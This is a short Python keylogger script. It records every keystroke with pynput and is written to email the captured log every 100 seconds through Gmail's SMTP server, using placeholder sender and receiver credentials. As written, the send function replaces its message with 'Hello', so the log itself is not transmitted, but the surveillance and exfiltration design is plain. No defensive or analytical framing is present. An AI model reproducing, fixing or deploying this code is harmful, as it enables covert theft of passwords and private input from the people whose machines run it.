import smtplib, ssl
import pynput.keyboard
import threading

log = ""

def key_press(key):
    global log
     
    try:
        log += str(key.char)
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            log += " "
        elif key == pynput.keyboard.Key.enter:
            log += "\n"
        elif key == key.shift:
            log += ""
        else:
            log += f" [{key}]"
    print(log)
    

def send_mail(message):
    port = 465
    password = "Your-password"  # if you have 2FA on:- use app password
    sender_email = "Your-sender-gmail"
    receiver_email = "Your-receiver-email"
    message = "Hello"
    # cereate secure ssl context
    context = ssl.create_default_context()

    with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)
    
def report():
    global log
    
    if log:
        # write_file(log)
        send_mail(log)
        log = " "
    timer = threading.Timer(100,report)  # sends email every 100 seconds
    timer.start()

# def write_file(keys):
#     try:
#         with open("log.txt","a") as file:
#             file.write(keys)
#     except Exception as e:
#         print(f"Failed to write to log.txt: {e}")

def start_keylogger():
    with pynput.keyboard.Listener(on_press=key_press) as listener:
        report()
        listener.join()

start_keylogger()

